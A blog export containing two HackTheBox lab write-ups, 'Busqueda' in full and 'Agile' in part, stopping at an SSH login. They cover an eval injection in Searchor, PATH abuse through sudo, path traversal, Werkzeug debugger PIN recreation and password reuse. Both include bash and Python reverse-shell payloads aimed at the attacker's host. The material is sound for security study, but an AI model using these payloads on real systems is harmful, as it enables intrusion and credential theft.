[{"content":"Enumeration Initial nmap:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 # Nmap 7.93 scan initiated Sun Apr 9 07:47:17 2023 as: nmap -sCV -oN nmap_initial.txt 10.129.203.183 Nmap scan report for 10.129.203.183 Host is up (0.023s latency). Not shown: 998 closed tcp ports (conn-refused) PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 256 4fe3a667a227f9118dc30ed773a02c28 (ECDSA) |_ 256 816e78766b8aea7d1babd436b7f8ecc4 (ED25519) 80/tcp open http Apache httpd 2.4.52 |_http-server-header: Apache/2.4.52 (Ubuntu) |_http-title: Did not follow redirect to http://searcher.htb/ Service Info: Host: searcher.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Sun Apr 9 07:47:26 2023 -- 1 IP address (1 host up) scanned in 9.27 seconds The open port 80 suggests an http server that we can visit. However, when we try to visit by ip address we are redirected to http://searcher.htb. We must add this address link to are hosts file.\n1 2 3 4 5 6 7 8 9 10 $ tail /etc/hosts # The following lines are desirable for IPv6 capable hosts ::1 ip6-localhost ip6-loopback fe00::0 ip6-localnet ff00::0 ip6-mcastprefix ff02::1 ip6-allnodes ff02::2 ip6-allrouters 10.10.11.208 searcher.htb Exploring the webpage Now upon vising the site, we see the website described as being able to search anything. We are given a wide selection of search engines to use, and then we can detail our search query as well:\nWe also see the option to auto redirect, but at first glance I have no idea what that means. When I select the engine Google and something to search, pressing the Search button results in the generation of a url that we might copy/paste into our browser.\nThis is how the search engine works: you supply the engine and the query, and the webpage will generate a link that can take you to a query using that search engine. Auto-redirect probably configures you to be taken directly to the link rather than this page showing nothing but the link text.\nExamining the bottom of the searcher page, we can see the web service is using Flask, and also that this searchor tool is open source:\nClicking on the Searchor 2.4.0 hyperlink redirects us to a github page\nEnumerating github pull requests and patch histories We can see from github that this is not the most recent version of searchor, so perhaps this version might have an unpatched vulnerability? For popular vulnerabilities, we can simply google search \u0026ldquo;Service Version X.X.X exploit\u0026rdquo; and get plenty of information. However, if Searchor is not big enough it might not get the same level of attention. In this case, it might be more fruitful to look at the version history for searchor, and see if there is any mention of patching an exploit. We can see in the overview for v2.4.2, there is a patched vulnerability mentioned\nSince the webpage is still using 2.4.0, this vulnerability should still exist, if we are able to take advantage. When we look at the link, the details say the search method in the code is utilizing an unsafe eval operation that can allow for arbitrary code execution.\nTo understand a little more, we can look at the code being changed in this pull request:\nWe can see here the two arguments we will provide the service, first being the engine, followed by query. It appears as though if we can escape the single quote wrapping around query, we might be able to directly call arguments in python\u0026rsquo;s eval() statement.\nBy editing the request in burpsuite, we can see when we supply a single ' mark, the request breaks.\nIf we can supply new arguments in the proper syntax, we can achieve code execution.\nFoothold Obtaining shell access as user svc After a little bit of trial and error, I managed to achieve code execution:\nIn addition to the single quote, we also needed ) to end the search function, followed by a , to supply a 2nd object to eval. __import__('os').system() is our set up for command execution, where we supply the shell command in system(). From here, a reverse shell can be obtained by searching for a bash rev shell payload:\n1 asdf\u0026#39;),__import__(\u0026#39;os\u0026#39;).system(\u0026#39;bash -c \u0026#34;bash -i \u0026gt;\u0026amp; /dev/tcp/10.10.14.139/8888 0\u0026gt;\u0026amp;1\u0026#34;\u0026#39;) # I found that this command had trouble executing from burpsuite, but has no issue if you simply return to the webpage and execute from your browser. On a listening session:\n1 2 3 4 5 6 7 8 $ nc -nvlp 8888 listening on [any] 8888 ... connect to [10.10.14.139] from (UNKNOWN) [10.10.11.208] 36252 bash: cannot set terminal process group (1631): Inappropriate ioctl for device bash: no job control in this shell svc@busqueda:/var/www/app$ id id uid=1000(svc) gid=1000(svc) groups=1000(svc) From here, we can grab the user.txt file.\nEnumerating the webserver\u0026rsquo;s git details When exploring the web file system, we see a .git folder in the web root directory:\n1 2 3 4 5 6 7 8 svc@busqueda:/var/www/app$ ls -al ls -al total 20 drwxr-xr-x 4 www-data www-data 4096 Apr 3 14:32 . drwxr-xr-x 4 root root 4096 Apr 4 16:02 .. -rw-r--r-- 1 www-data www-data 1124 Dec 1 2022 app.py drwxr-xr-x 8 www-data www-data 4096 Aug 14 00:07 .git drwxr-xr-x 2 www-data www-data 4096 Dec 1 2022 templates We know this service originally came from a public git repo, but it is a little surprising to see the iconic .git folder when file layout does not at all match with the git repo. When viewing Searchor 2.4.0, this is what the repo looks like:\nA lot of the files have been removed, changed, renamed, or other. However, exploring a little deeper, we can start to see what might be going on:\n1 2 3 svc@busqueda:/var/www/app/.git$ cat logs/HEAD cat logs/HEAD 0000000000000000000000000000000000000000 5ede9ed9f2ee636b5eb559fdedfd006d2eae86f4 administrator \u0026lt;administrator@gitea.searcher.htb\u0026gt; 1671970461 +0000 commit (initial): Initial commit When examining the current commit id, we can see the .git is not even associated with the github page Searchor. Instead, it looks like administrator built this webpage personally, utilizing Searchor 2.4.0 code, then created a new git repository with Gitea instead! Gitea is a git-based service that can be self-hosted. Its purpose is similar to Github, but with the option for completely private hosting it allows for a much more isolated development workflow that might never leave a company\u0026rsquo;s infrastructure.\nThe new subdomain is particularly interesting, gitea.searcher.htb. Perhaps if we add this to our /etc/hosts file, we might view it ourselves?\n1 2 3 4 5 6 7 8 9 10 $ tail /etc/hosts # The following lines are desirable for IPv6 capable hosts ::1 ip6-localhost ip6-loopback fe00::0 ip6-localnet ff00::0 ip6-mcastprefix ff02::1 ip6-allnodes ff02::2 ip6-allrouters 10.10.11.208 searcher.htb gitea.searcher.htb Viewing the website:\nSearching around, we can see users administrator and cody, but no repositories are publicly viewable.\nFinding credentials and testing for password re-use When looking back at the .git/config file, we can find credentials:\n1 2 3 4 5 6 7 8 9 10 11 12 13 svc@busqueda:/var/www/app/.git$ cat config cat config [core] repositoryformatversion = 0 filemode = true bare = false logallrefupdates = true [remote \u0026#34;origin\u0026#34;] url = http://cody:jh1usoih2bkjaspwe92@gitea.searcher.htb/cody/Searcher_site.git fetch = +refs/heads/*:refs/remotes/origin/* [branch \u0026#34;main\u0026#34;] remote = origin merge = refs/heads/main We can see in plaintext, cody\u0026rsquo;s password of jh1usoih2bkjaspwe92. If there were a user named cody on the system, my first thought would be to check su to see if i can change my shell user to cody. However, only user svc exists on the box. Still, it might be that user svc was set up by cody, using the same password? It is worth a try, since it costs nothing:\n1 2 3 4 5 6 7 8 9 svc@busqueda:/var/www/app/.git$ sudo -l [sudo] password for svc: Matching Defaults entries for svc on busqueda: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin, use_pty User svc may run the following commands on busqueda: (root) /usr/bin/python3 /opt/scripts/system-checkup.py * I used sudo -l to get the password check for svc, and not only did it work, but we also seem to have a sudo command we can run as root! Another check we might have done is to ssh in as svc. We can still do so, and now we know it will work:\n1 2 3 4 5 $ ssh svc@searcher.htb svc@searcher.htb\u0026#39;s password: Welcome to Ubuntu 22.04.2 LTS (GNU/Linux 5.15.0-69-generic x86_64) \u0026lt;...SNIP...\u0026gt; svc@busqueda:~$ Before forgetting about it, the password needs to be checked on the original service as well: the gitea page. It does indeed work, and there is one repository now viewable:\nEnumerating svc\u0026rsquo;s sudo actions Checking out the system-checkup script:\n1 2 svc@busqueda:~$ ls -al /opt/scripts/system-checkup.py -rwx--x--x 1 root root 1903 Dec 24 2022 /opt/scripts/system-checkup.py We cannot write over the file, so the exploit must come from abusing what the file does. Also, we cannot read the file, so we must figure out what is going on by running the script.\n1 2 3 4 5 6 svc@busqueda:~$ sudo /usr/bin/python3 /opt/scripts/system-checkup.py * Usage: /opt/scripts/system-checkup.py \u0026lt;action\u0026gt; (arg1) (arg2) docker-ps : List running docker containers docker-inspect : Inpect a certain docker container full-checkup : Run a full system checkup It appears to be referencing docker containers running on the system. To start, let\u0026rsquo;s check docker-ps:\n1 2 3 4 svc@busqueda:~$ sudo /usr/bin/python3 /opt/scripts/system-checkup.py docker-ps CONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMES 960873171e2e gitea/gitea:latest \u0026#34;/usr/bin/entrypoint…\u0026#34; 7 months ago Up 15 hours 127.0.0.1:3000-\u0026gt;3000/tcp, 127.0.0.1:222-\u0026gt;22/tcp gitea f84a6b33fb5a mysql:8 \u0026#34;docker-entrypoint.s…\u0026#34; 7 months ago Up 15 hours 127.0.0.1:3306-\u0026gt;3306/tcp, 33060/tcp mysql_db We see two containers, interestingly another gitea container? Or is this perhaps the same on we just looked at? I am not familiar enough with docker to know. Next, I try docker-inspect, and use the container ID of the gitea container, 960873171e2e:\n1 2 svc@busqueda:~$ sudo /usr/bin/python3 /opt/scripts/system-checkup.py docker-inspect 960873171e2e Usage: /opt/scripts/system-checkup.py docker-inspect \u0026lt;format\u0026gt; \u0026lt;container_name\u0026gt; I have no idea what format options are possible, so I have to read up on what this command can do. docker-inspect is a commonly conserved docker command, so there is an entire webpage explaining it. Looking at some examples, I\u0026rsquo;m hoping I can specify something like this command to output all details:\n1 docker inspect --format=\u0026#39;{{json .Config}}\u0026#39; $INSTANCE_ID Running the command and beautifying the output:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 svc@busqueda:~$ sudo /usr/bin/python3 /opt/scripts/system-checkup.py docker-inspect \u0026#39;{{json .Config}}\u0026#39; 960873171e2e { \u0026#34;Hostname\u0026#34;: \u0026#34;960873171e2e\u0026#34;, \u0026#34;Domainname\u0026#34;: \u0026#34;\u0026#34;, \u0026#34;User\u0026#34;: \u0026#34;\u0026#34;, \u0026#34;AttachStdin\u0026#34;: false, \u0026#34;AttachStdout\u0026#34;: false, \u0026#34;AttachStderr\u0026#34;: false, \u0026#34;ExposedPorts\u0026#34;: { \u0026#34;22/tcp\u0026#34;: {}, \u0026#34;3000/tcp\u0026#34;: {} }, \u0026#34;Tty\u0026#34;: false, \u0026#34;OpenStdin\u0026#34;: false, \u0026#34;StdinOnce\u0026#34;: false, \u0026#34;Env\u0026#34;: [ \u0026#34;USER_UID=115\u0026#34;, \u0026#34;USER_GID=121\u0026#34;, \u0026#34;GITEA__database__DB_TYPE=mysql\u0026#34;, \u0026#34;GITEA__database__HOST=db:3306\u0026#34;, \u0026#34;GITEA__database__NAME=gitea\u0026#34;, \u0026#34;GITEA__database__USER=gitea\u0026#34;, \u0026#34;GITEA__database__PASSWD=yuiu1hoiu4i5ho1uh\u0026#34;, \u0026#34;PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin\u0026#34;, \u0026#34;USER=git\u0026#34;, \u0026#34;GITEA_CUSTOM=/data/gitea\u0026#34; ], \u0026#34;Cmd\u0026#34;: [ \u0026#34;/bin/s6-svscan\u0026#34;, \u0026#34;/etc/s6\u0026#34; ], \u0026#34;Image\u0026#34;: \u0026#34;gitea/gitea:latest\u0026#34;, \u0026#34;Volumes\u0026#34;: { \u0026#34;/data\u0026#34;: {}, \u0026#34;/etc/localtime\u0026#34;: {}, \u0026#34;/etc/timezone\u0026#34;: {} }, \u0026#34;WorkingDir\u0026#34;: \u0026#34;\u0026#34;, \u0026#34;Entrypoint\u0026#34;: [ \u0026#34;/usr/bin/entrypoint\u0026#34; ], \u0026#34;OnBuild\u0026#34;: null, \u0026#34;Labels\u0026#34;: { \u0026#34;com.docker.compose.config-hash\u0026#34;: \u0026#34;e9e6ff8e594f3a8c77b688e35f3fe9163fe99c66597b19bdd03f9256d630f515\u0026#34;, \u0026#34;com.docker.compose.container-number\u0026#34;: \u0026#34;1\u0026#34;, \u0026#34;com.docker.compose.oneoff\u0026#34;: \u0026#34;False\u0026#34;, \u0026#34;com.docker.compose.project\u0026#34;: \u0026#34;docker\u0026#34;, \u0026#34;com.docker.compose.project.config_files\u0026#34;: \u0026#34;docker-compose.yml\u0026#34;, \u0026#34;com.docker.compose.project.working_dir\u0026#34;: \u0026#34;/root/scripts/docker\u0026#34;, \u0026#34;com.docker.compose.service\u0026#34;: \u0026#34;server\u0026#34;, \u0026#34;com.docker.compose.version\u0026#34;: \u0026#34;1.29.2\u0026#34;, \u0026#34;maintainer\u0026#34;: \u0026#34;maintainers@gitea.io\u0026#34;, \u0026#34;org.opencontainers.image.created\u0026#34;: \u0026#34;2022-11-24T13:22:00Z\u0026#34;, \u0026#34;org.opencontainers.image.revision\u0026#34;: \u0026#34;9bccc60cf51f3b4070f5506b042a3d9a1442c73d\u0026#34;, \u0026#34;org.opencontainers.image.source\u0026#34;: \u0026#34;https://github.com/go-gitea/gitea.git\u0026#34;, \u0026#34;org.opencontainers.image.url\u0026#34;: \u0026#34;https://github.com/go-gitea/gitea\u0026#34; } } There is a lot of information that is tricky to follow, but I\u0026rsquo;m hoping the most notable information is the new password displayed in the GITEA__database__ segment: yuiu1hoiu4i5ho1uh\nFrom here we can enter the mysql database as gitea, and see that there is not much information available.\nSince passwords were re-used before, my first thought is to try this password as the root user on the machine?\n1 2 3 svc@busqueda:~$ su Password: su: Authentication failure It does not work. However, when I return to the gitea webpage and use this credential for user administrator, the password is accepted!\nPrivilege Escalation Reading system-checkup.py source code Now under scripts, we can see what is likely the system-checkup.py we had been executing:\nWith the source code in hand, we can clearly see a very serious oversight in the code:\n1 2 3 4 5 6 7 8 elif action == \u0026#39;full-checkup\u0026#39;: try: arg_list = [\u0026#39;./full-checkup.sh\u0026#39;] print(run_command(arg_list)) print(\u0026#39;[+] Done!\u0026#39;) except: print(\u0026#39;Something went wrong\u0026#39;) exit(1) When running full-checkup, the full-checkup.sh is not using the absolute path. Meaning, we can create our own full-checkup.sh in a current working directory, execute full-checkup as root, and our own full-checkup.sh will be ran instead.\nAbusing File Path Manipulation First I enter a directory where i can write files:\n1 2 svc@busqueda:~$ cd /dev/shm svc@busqueda:/dev/shm$ Next, I create a simple reverse shell script under the name full-checkup.sh:\n1 2 3 4 svc@busqueda:/dev/shm$ cat full-checkup.sh #!/bin/bash bash -i \u0026gt;\u0026amp; /dev/tcp/10.10.14.139/8888 0\u0026gt;\u0026amp;1 On my kali machine, I set up a listener:\n1 2 $ nc -nvlp 8888 listening on [any] 8888 ... And finally, I run the sudo command:\n1 2 svc@busqueda:/dev/shm$ chmod +x full-checkup.sh svc@busqueda:/dev/shm$ sudo /usr/bin/python3 /opt/scripts/system-checkup.py full-checkup Back on my listening session:\n1 2 3 4 5 6 7 $ nc -nvlp 8888 listening on [any] 8888 ... connect to [10.10.14.139] from (UNKNOWN) [10.10.11.208] 60866 root@busqueda:/dev/shm# id id uid=0(root) gid=0(root) groups=0(root) root@busqueda:/dev/shm# Now we are root, and root.txt is up for grabs.\nReflection I quite enjoyed this box, being a rather relaxed set of obstacles while not giving anythinig away for free. Finding the web server so strikingly different from Searchor was a little disorienting, but it makes sense that some modifications would be made to translate Searchor, a cli=based project, into something that a web server can handle for visitors.\n","date":"2023-08-13T10:17:28-05:00","image":"https://yuwenmichael.netlify.app/post/hackthebox-busqueda/Busqueda_hucd7cd900a381e6f396b4d3fd74d99876_352215_120x120_fill_box_smart1_3.png","permalink":"https://yuwenmichael.netlify.app/post/hackthebox-busqueda/","title":"HackTheBox - Busqueda"},{"content":"Enumeration Initial nmap:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 # Nmap 7.92 scan initiated Sat Mar 4 14:42:58 2023 as: nmap -sCV -A -oN nmap_init.txt 10.129.27.120 Nmap scan report for 10.129.27.120 Host is up (0.038s latency). Not shown: 998 closed tcp ports (conn-refused) PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 256 f4:bc:ee:21:d7:1f:1a:a2:65:72:21:2d:5b:a6:f7:00 (ECDSA) |_ 256 65:c1:48:0d:88:cb:b9:75:a0:2c:a5:e6:37:7e:51:06 (ED25519) 80/tcp open http nginx 1.18.0 (Ubuntu) |_http-title: Did not follow redirect to http://superpass.htb |_http-server-header: nginx/1.18.0 (Ubuntu) Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Sat Mar 4 14:43:10 2023 -- 1 IP address (1 host up) scanned in 11.87 seconds Aside from credential-locked ssh, port, we only see http port 80 open. The nmap shows that we will be redirected to http://sueprpass.htb, so we must add this to our /etc/hosts file in order to properly visit:\n1 2 3 4 5 6 7 8 9 10 $ tail /etc/hosts # The following lines are desirable for IPv6 capable hosts ::1 ip6-localhost ip6-loopback fe00::0 ip6-localnet ff00::0 ip6-mcastprefix ff02::1 ip6-allnodes ff02::2 ip6-allrouters 10.10.11.203 superpass.htb We see superpass as a super password manager:\nTrying to login with generic credentials does not succeed, but we are able to register an account, asdf:asdf\nWe see a vault where we can begin to generate passwords, and label them with sites/usernames.\nThe export feature is interesting, as depending on how the query is designed, we may be able to alter our request and receive unintended responses. Using burpsuite, we can intercept our traffic and get a better idea on how we are interacting with the web service.\nWe can see upon clicking Export we are sent to the url http://superpass.htb/vault/export on a GET request:\nAn interesting finding at this point, we see that superpass.htb server is described as nginx. However, this /vault/export pathway is not a .php file, as visiting superpass.htb/vault/export.php results in 404 Not Found. We will eventually learn that this service is running from Flask, although it wasn\u0026rsquo;t apparent at first glance if you didn\u0026rsquo;t run into the common SQLAlchemy error.\nSince we didn\u0026rsquo;t click the save icon when generating out password, it seems like our database is still empty.\nOnce we add a password, we can see the call redirects to a custom url, download?fn=asdf_export_49adcafaf8.csv. We might be able to reverse the process that generates the names, but regardless we will need more information such as usernames before we could take advantage:\nArbitrary file read in /download In a simpler approach, we can check if we are able to reference any file by specifying the path: http://superpass.htb/download?fn=../../../../../../../etc/passwd\nUpon visiting this link, we receive a download prompt for our file. We can proceed to visit each url we want to check then open the downloaded file individually, or we can see the output directly through burpsuite:\nIn this file we can see 4 user accounts:\n1 2 3 4 corum:x:1000:1000:corum:/home/corum:/bin/bash runner:x:1001:1001::/app/app-testing/:/bin/sh edwards:x:1002:1002::/home/edwards:/bin/bash dev_admin:x:1003:1003::/home/dev_admin:/bin/bash Viewing a non-existent file we can see interesting information through the given error. The service is utilizing Werkzeug Debugger (python Flask), the download function is pulling from /tmp/ and the flask SECRET is also displayed:\nNote, the SECRET is only visible when looking at the source page, or through raw output such as Burpsuite or curl:\n1 2 3 4 5 6 \u0026lt;script\u0026gt; var CONSOLE_MODE = false, EVALEX = true, EVALEX_TRUSTED = false, SECRET = \u0026#34;tDxE1kBphctDjlZ1DvYf\u0026#34;; \u0026lt;/script\u0026gt; The last section in the traceback is particularly important, as it gives a full pathway to our source files so that we might view them exploiting this download vulnerability.\nFrom here, we can enumerate all or most of the python source files by watching the imports. For example, from superpass.services.utility_service import get_random tells us that there is a python file accessible at /app/app/superpass/services/utility_service.py. We can also determine that the main app.py file will be located at /app/app/superpass/app.py, based on where the import path is starting.\nUnsuccessful Foothold Attempts Recreating export.csv My first thought is to see how the export is behaving. Since we have a list of usernames on the machine, perhaps we can recall an export.csv that they have previously generated? I find my answer in /app/app/superpass/views/services/password_service.py:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 def generate_csv(user): rand = get_random(10) fn = f\u0026#39;{user.username}_export_{rand}.csv\u0026#39; path = f\u0026#39;/tmp/{fn}\u0026#39; header = [\u0026#39;Site\u0026#39;, \u0026#39;Username\u0026#39;, \u0026#39;Password\u0026#39;] session = db_session.create_session() passwords = session.query(Password) \\ .filter(Password.user_id == user.id) \\ .all() session.close() with open(path, \u0026#39;w\u0026#39;) as f: writer = csv.writer(f) writer.writerow(header) writer.writerows((p.get_dict().values() for p in passwords)) It looks like the numbers appended are from get_random, defined in /app/app/superpass/services/utility_service.py:\n1 2 3 4 5 import datetime import hashlib def get_random(chars=20): return hashlib.md5(str(datetime.datetime.now()).encode() + b\u0026#34;SeCReT?!\u0026#34;).hexdigest()[:chars] It includes a time variable which we have no way of knowing. Essentially, it is technically possible to try to brute force potential exports by guessing every possible combination of 10 characters. But this can be considered a last resort, as it is not guaranteed that machine usernames will match the service\u0026rsquo;s account names, nor guarantee that the user had generated a csv file at all.\nForging a flask cookie My next thought is with the source code available and the flask secret (given through the error), we might try to forge a cookie for a different user.\nStarting with our cookie, we can grab it from Burpsuite\u0026rsquo;s request after session=\n1 .eJwlzjEOwzAIAMC_MHewgYDJZyJiQO2aNFPVvzdS51vuA1sdeT5hfR9XPmB7BaygREnUXHNahqQzMpG1bqUkrMWFSN3CzW4tHTI6Kk5H8d0jVaa6OZlbaFMxDqlR0tBmYx6Yfei-hA0WGr4IlfalocRu0wTuyHXm8d8YfH9o4y4B.ZMqudQ.Z2CKAj5PpZ0A7xvhgTgYMlpMJ0c Visiting a Flask cookie decoder online tool, we can decode without issue into something more readable:\n1 2 3 4 5 { \u0026#34;_fresh\u0026#34;: true, \u0026#34;_id\u0026#34;: \u0026#34;733e330a7ec9ed6ea424339019f73647f4f22319da996eaf78681272ca26abade76c7a9a39a9d707694d6f8f6029c04482e187b5d984638a563f715026db9c96\u0026#34;, \u0026#34;_user_id\u0026#34;: \u0026#34;9\u0026#34; } While the _id appears to be a unique string likely tied to our current login session, we can see that we are user_id 9. Assuming the count starts at 0 and the admin has the first account, I edit this segment of the cookie and then I must re-sign using Flask\u0026rsquo;s secret key. To do so, I utilize the popular tool Flask-Unsign.\n1 2 3 4 5 6 7 ┌──(kali㉿kali)-[~/Documents/Agile] └─$ cat tosign.txt {\u0026#39;_fresh\u0026#39;: True, \u0026#39;_id\u0026#39;: \u0026#39;733e330a7ec9ed6ea424339019f73647f4f22319da996eaf78681272ca26abade76c7a9a39a9d707694d6f8f6029c04482e187b5d984638a563f715026db9c96\u0026#39;, \u0026#39;_user_id\u0026#39;: \u0026#39;0\u0026#39;} ┌──(kali㉿kali)-[~/Documents/Agile] └─$ flask-unsign -s -S \u0026#39;tDxE1kBphctDjlZ1DvYf\u0026#39; --cookie tosign.txt InRvc2lnbi50eHQi.ZMqw8Q.zmr3nM3FEIqwYykzEMSZnSCCPsk Unfortunately, trying to use this cookie resulted in a failure. Presumably, the _id hash no longer correlates to _user_id value and the cookie session becomes invalid.\nIDOR access on other user\u0026rsquo;s passwords When following the request trail involved in editing a password or leaving editor mode, we can see the url activities visiting /vault/row/\u0026lt;id\u0026gt; or /vault/edit_row/\u0026lt;id\u0026gt;. Additionally, when reviewing the source code, we see a similar check being performed, with seemingly no verification on the user. We can write a quick script to check a number range, or do the same in Burpsuite Intruder option:\n1 2 3 4 5 6 #!/bin/bash for i in {0..15} do curl http://superpass.htb/vault/get/$i --cookie \u0026#34;session=.eJwlzjEOwzAIAMC_MHewgYDJZyJiQO2aNFPVvzdS51vuA1sdeT5hfR9XPmB7BaygREnUXHNahqQzMpG1bqUkrMWFSN3CzW4tHTI6Kk5H8d0jVaa6OZlbaFMxDqlR0tBmY x6Yfei-hA0WGr4IlfalocRu0wTuyHXm8d8YfH9o4y4B.ZMqudQ.Z2CKAj5PpZ0A7xvhgTgYMlpMJ0c\u0026#34; done This approach was successful on box release, but has since been patched. Apparently it was never an intended approach.\nFoothold Recreating Werkzeug\u0026rsquo;s Debugger PIN Eventually I turn myself to the system\u0026rsquo;s active debugger mode. We noticed that this is turned on, since when we requested to download a file that didn\u0026rsquo;t exist, we saw detailed traceback. From these error pages, we can open an interactive terminal by clicking on the console icon available when hovering over one of the code lines:\nHowever, in order to prevent any random user from executing shell commands, a customized PIN is generated when the web server is launched. This is PIN is intended to be accessible only to the operators on the machine. The PIN is provided to console output, not saved in any guessable location.\nThere is a hacktricks article covering how we generate a matching PIN number based on some of the system\u0026rsquo;s information.\nWe must gather system information utilized to generate the PIN, then we can recreate it locally using the script presented in the article. Each component was a small adventure to get. The final script contained the following information:\n1 2 3 4 5 6 7 8 9 10 11 12 13 import hashlib from itertools import chain probably_public_bits = [ \u0026#39;www-data\u0026#39;,# username \u0026#39;flask.app\u0026#39;,# modname \u0026#39;wsgi_app\u0026#39;,# getattr(app, \u0026#39;__name__\u0026#39;, getattr(app.__class__, \u0026#39;__name__\u0026#39;)) \u0026#39;/app/venv/lib/python3.10/site-packages/flask/app.py\u0026#39; # getattr(mod, \u0026#39;__file__\u0026#39;, None), ] private_bits = [ \u0026#39;345052401235\u0026#39;,# str(uuid.getnode()), /sys/class/net/ens33/address \u0026#39;ed5b159560f54721827644bc9b220d00superpass.service\u0026#39;# get_machine_id(), /etc/machine-id ] Username as www-data is common for linux web services, although python can also be run by users as well. I had been trying combinations with both www-data as well as runner, as this account seemed like it might have been generated for the sole purpose of running a web server. Modname as flask.app is the default option provided by Hacktricks, but also we can see this in app.py, where it simply states import flask. wsgi_app was the hardest to find, as this variable is not well defined in the article, simply presented as Flask. Under def enable_debug(): from app.py, we see the debug application referred to as app.wsgi_app = DebuggedApplication(app.wsgi_app, True). /app/venv/lib/python3.10/site-packages/flask/app.py is given on the error page. Private Bits: When accessing /sys/class/net/eth0/address, we get id 00:50:56:b9:ce:53: To convert into the private bit variable, we utilize python to print:\n1 2 \u0026gt;\u0026gt;\u0026gt; print(0x005056b9ce53) 345052401235 Machine ID is a combination of /etc/machine-id and the last section of /proc/self/cgroup. Visiting /etc/machine-id: Visiting /proc/self/cgroup:\nThe combined bit is ed5b159560f54721827644bc9b220d00superpass.service\nRemote Code Execution as www-data Now with a debug PIN correctly generated, we can finally access the debugging console by clicking the interactive icon on any code in the error:\nimport socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\u0026quot;10.10.14.133\u0026quot;,8888));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(\u0026quot;/bin/sh\u0026quot;)\nOn our listener:\n1 2 3 4 5 6 $ nc -nvlp 8888 listening on [any] 8888 ... connect to [10.10.14.133] from (UNKNOWN) [10.10.11.203] 55440 $ whoami whoami www-data We have a shell, but it is still a \u0026ldquo;dumb\u0026rdquo; shell. Features such as autocomplete or interactive binaries such as vim will not work well, so we need to stabilize the shell. There are many ways to do this, my favorite being the use of script:\n1 2 3 $ script -qc /bin/bash /dev/null script -qc /bin/bash /dev/null (venv) www-data@agile:/app/app$ From here we background the session with ctrl+Z, and type stty raw -echo; fg. The fg will put us back into the rev shell session, where we press enter a 2nd time and our shell has been stabilized.\n1 2 3 4 5 6 7 8 (venv) www-data@agile:/app/app$ ^Z zsh: suspended nc -nvlp 8888 ┌──(kali㉿kali)-[~/Documents/Agile] └─$ stty raw -echo; fg [1] + continued nc -nvlp 8888 (venv) www-data@agile:/app/app$ Lateral Movement Accessing the SQL database After brief enumeration, I find an interesting json file in the base /app folder containing the SQL credentials:\n1 2 (venv) www-data@agile:/app$ cat config_prod.json {\u0026#34;SQL_URI\u0026#34;: \u0026#34;mysql+pymysql://superpassuser:dSA6l7q*yIVs$39Ml6ywvgK@localhost/superpass\u0026#34;} We see credentials as superpassuser:dSA6l7q*yIVs$39Ml6ywvgK. Since our shell has been stabilized, we can call an interactive mysql session. This would have failed if we had tried earlier.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 (venv) www-data@agile:/app$ mysql -u superpassuser -p Enter password: Welcome to the MySQL monitor. Commands end with ; or \\g. Your MySQL connection id is 392 Server version: 8.0.32-0ubuntu0.22.04.2 (Ubuntu) Copyright (c) 2000, 2023, Oracle and/or its affiliates. Oracle is a registered trademark of Oracle Corporation and/or its affiliates. Other names may be trademarks of their respective owners. Type \u0026#39;help;\u0026#39; or \u0026#39;\\h\u0026#39; for help. Type \u0026#39;\\c\u0026#39; to clear the current input statement. mysql\u0026gt; Navigating the SQL is rather easy since there isn\u0026rsquo;t much information. The only unique database is superpass, and only 2 tables exist:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 mysql\u0026gt; show tables; +---------------------+ | Tables_in_superpass | +---------------------+ | passwords | | users | +---------------------+ 2 rows in set (0.00 sec) mysql\u0026gt; select * from passwords; +----+---------------------+---------------------+----------------+----------+----------------------+---------+ | id | created_date | last_updated_data | url | username | password | user_id | +----+---------------------+---------------------+----------------+----------+----------------------+---------+ | 3 | 2022-12-02 21:21:32 | 2022-12-02 21:21:32 | hackthebox.com | 0xdf | 762b430d32eea2f12970 | 1 | | 4 | 2022-12-02 21:22:55 | 2022-12-02 21:22:55 | mgoblog.com | 0xdf | 5b133f7a6a1c180646cb | 1 | | 6 | 2022-12-02 21:24:44 | 2022-12-02 21:24:44 | mgoblog | corum | 47ed1e73c955de230a1d | 2 | | 7 | 2022-12-02 21:25:15 | 2022-12-02 21:25:15 | ticketmaster | corum | 9799588839ed0f98c211 | 2 | | 8 | 2022-12-02 21:25:27 | 2022-12-02 21:25:27 | agile | corum | 5db7caa1d13cc37c9fc2 | 2 | | 10 | 2023-08-03 15:36:53 | 2023-08-03 15:36:53 | | | 7bbe46f078cc431df0c8 | 11 | +----+---------------------+---------------------+----------------+----------+----------------------+---------+ 6 rows in set (0.00 sec) Recall that on this machine, we saw a user named corum? Perhaps the \u0026lsquo;agile\u0026rsquo; url password is referring to this machine. When checking with su, we see a success.\n1 2 3 (venv) www-data@agile:/app$ su corum Password: corum@agile:/app$ As great as the stabilized reverse shell is, I happily move to an ssh connection from this point, as port 22 was confirmed open.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 $ ssh corum@superpass.htb corum@superpass.htb\u0026#39;s password: Welcome to Ubuntu 22.04.2 LTS (GNU/Linux 5.15.0-60-generic x86_64) * Documentation: https://help.ubuntu.com * 